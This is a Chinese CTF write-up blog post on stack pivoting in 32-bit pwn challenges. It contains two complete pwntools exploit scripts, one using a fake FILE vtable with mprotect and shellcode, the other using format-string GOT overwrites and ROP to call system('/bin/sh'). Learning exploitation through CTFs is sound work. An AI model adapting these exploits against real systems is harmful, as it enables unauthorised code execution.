---
title: pwn中的栈迁移
tags:
  - PWN
  - stack
categories: []
date: 2017-04-26 16:38:17
---

## 序

连着好几次遇到栈迁移问题了，总结记录下。
每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：
1. stack pivot后mprotect
2. ebp的partial overwrite
3. 栈迁移的gadget

## i春秋百度杯try to pwn

我们用`0xff`来填充`FILE`结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。

eax由这条语句赋值，其中ebx与eax的值为：
```
 EAX  0x80efa9c (x+188) —▸ 0x80e2b6d (__EH_FRAME_BEGIN__+38021) ◂— pop    esp
 EBX  0x80efa04 (x+36) ◂— 0xffffff7f
```
`0x804f915 <fclose+53>     mov    eax, dword ptr [ebx + 0x94]`
ebx的值为`fake_FILE_addr+36`
eax的值为`fake_vtable`的前4个字节

我们存储shellcode的地址的addr为`fake_vtable`的4到8个字节。

还要注意下mprotexct的函数调用规定
`int mprotect(void *addr, size_t len, int prot);`
```
mprotect()  changes  the  access protections for the calling process's memory pages containing any part of the address range in the interval [addr, addr+len-1].  addr must be aligned  to  a page boundary.
```
注意这里的地址调用一定是**页对齐**的。
`int prot`这里的数字可以简单参照linux的权限`rwx`，总是7是可读可写可执行。

这一题在尝试过程中发现\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。

exp(参考了[这篇文章](http://blog.csdn.net/qq_29343201/article/details/69666824))：
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 1
local = 1
debug = 0

global p

if slog: context(log_level = 'debug')
if local:
    p = process('./fake')
else:
    p = remote()

if local and debug:
    gdb.attach(p, open('debug'))

elf = ELF('./fake')
name_addr = 0x80EF9E0
mprotect_addr = elf.symbols['mprotect']
un_FILE_addr = 0x80EFA00
fake_FILE_addr = 0x80EFA04
fake_vtable_addr = fake_FILE_addr + 0x94 + 0x4
x_r = 0x08048f66
p_r = 0x080e2b6d

offset = un_FILE_addr - name_addr

shellcode = '''
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push '/bin///sh\x00' */
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
/* push argument array ['sh\x00'] */
/* push 'sh\x00\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016972
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* 'sh\x00' */
mov ecx, esp
xor edx, edx
/* call execve() */
/* push SYS_execve */
mov eax, 0xf
sub eax, 0x4
push eax
pop eax
int 0x80
'''

def pwn():
    p.recvuntil('name?\n')
    payload = 'a' * offset
    # fake_FILE_addr
    payload += p32(fake_FILE_addr)
    # fake_FILE
    payload += '\xff' * 0x94
    # fake_jmp_t
    payload += p32(fake_vtable_addr)

    # fake_vtable
    payload += p32(p_r)
    payload += p32(un_FILE_addr + 300)
    payload += p32(x_r) *  16

    # mprotect
    junk = 300 - len(payload) + 32
    payload += cyclic(junk)
    payload += p32(mprotect_addr)
    payload += p32(un_FILE_addr + 300 + 20) # shellcode addr
    payload += p32(0x080ef000)
    payload += p32(1024)
    payload += p32(7)
    payload += asm(shellcode)
    gdb.attach(p)

    p.sendline(payload)

    p.recvuntil('>')
    p.sendline('3')

if __name__ == '__main__':
    pwn()
    p.interactive()
```

## 南京线下赛decoder

`checksec`:
```
root@kali ~/c/NJoffline# checksec decoder
[*] '/root/ctf-problem/NJoffline/decoder'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

没开什么保护，观察后发现存在栈溢出，但是不能构造rop，因为esp的地址是由栈上数据给的，直接覆盖的话会ret到奇怪的地方去，也就是说造成栈溢出的栈底数据是我们不可控的。

所以，如果我们能够栈的位置到可控部分，我们就可以劫持eip，构造rop chain。

```
root@kali ~/c/NJoffline# ROPgadget --binary decoder | grep 'esp'
0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048605 : add esp, 0x10 ; leave ; ret
0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret
0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048492 : add esp, 8 ; pop ebx ; ret
0x08048af7 : and esp, dword ptr [ebx + 0x804b054] ; nop ; pop ebp ; ret
0x08048cd7 : clc ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x0804848e : inc byte ptr [eax] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048687 : je 0x8048684 ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x08048d33 : jne 0x8048d21 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048cd5 : lea esp, dword ptr [ebp - 8] ; pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08048cdb : lea esp, dword ptr [ecx - 4] ; ret
0x08048d4f : mov bl, 0x22 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804868a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x080485d0 : mov ebx, dword ptr [esp] ; ret
0x08048b30 : nop ; add esp, 0x40 ; pop edi ; pop ebp ; ret
0x080485cf : nop ; mov ebx, dword ptr [esp] ; ret
0x080485cd : nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x080485cb : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x08048cda : pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08048cd8 : pop ecx ; pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08048cd9 : pop edi ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08048689 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x08048634 : sub esp, 0x10 ; push eax ; push 0x804b04c ; call edx
0x080485fb : sub esp, 0x14 ; push 0x804b04c ; call eax
0x0804868c : sub esp, 0x14 ; push eax ; call edx
0x08048475 : sub esp, 8 ; call 0x80485d9
0x08048af6 : xor esp, dword ptr [ebx] ; mov dword ptr [0x804b054], eax ; nop ; pop ebp ; ret
```

发现这几条还是可用的：
```
0x08048490 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048605 : add esp, 0x10 ; leave ; ret
0x08048b31 : add esp, 0x40 ; pop edi ; pop ebp ; ret
0x08048d35 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048492 : add esp, 8 ; pop ebx ; ret
```

于是我们的思路如下：
1. 在栈上利用gadget`0x08048b31`布置好ropchain
2. 利用fsb将fflish改为我们的gadget`0x08048b31`
3. 在bss写入`/bin/sh`
4. 修改fflush为system

附上南大某女生exp:
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *
import base64

slog = 1
local = 1
debug = 0

if slog: context.log_level = True
if local:
    p = process('./decoder')
    libc = ELF('/lib32/libc.so.6')
else:
    p = remote('172.16.1.10', 20000)
    libc = ELF('./lib/i386-linux-gnu/libc-2.19.so')


elf = ELF('decoder')

printf_got = elf.got['printf']		#  0x80484c0
printf_plt = elf.symbols['printf'] 
read_addr = elf.symbols['read']
fflush_plt = elf.symbols['fflush']

realloc_got = elf.got['realloc']
fflush_got = elf.got['fflush']

main_addr = 0x804836e

print('fflush_got = ' + hex(fflush_got))
print('printf_plt = ' + hex(printf_plt))

addesp_72 = 0x08048b31
rodata = 0x8048de0 # '%d:%s'
bss_addr = 0x804b050

s = base64.b64encode('%02052d%20$hn%033581d%21$hn%22$x')  # add_esp

payload = s + (13 - len(s) / 4) * p32(0) + p32(printf_plt)+ p32(addesp_72) + p32(rodata) + p32(1) + p32(printf_got)
# printf(rodata, '1', printf_got) 
# 0xffa8a3f4 
payload += p32(fflush_got + 2) + p32(fflush_got) + p32(fflush_got) 

payload += p32(0x1) * 0xc  + p32(read_addr) + p32(addesp_72) + p32(0) + p32(fflush_got) + p32(4)   #0xffa8a434 -> read

payload += p32(0x2) * 0xf + p32(read_addr) + p32(addesp_72) + p32(0) + p32(bss_addr) + p32(8)

payload += p32(0x3) * 0xf + p32(fflush_plt) + p32(0xdeadbeef) + p32(bss_addr)

# gdb.attach(p, open('debug'))
gdb.attach(p)
p.recvuntil('DECODER\n')
p.sendline(payload)

p.recvuntil(':')
printf_addr = u32(p.recv(4))

system_addr = printf_addr + libc.symbols['system'] - libc.symbols['printf']
#binsh_addr = printf_addr + next(libc.search('/bin/sh')) - libc.symbols['printf']

print('system_addr = ' + hex(system_addr))

p.send(p32(system_addr))
p.send("/bin/sh\0")

p.interactive()
```

## 2017BCTF100levels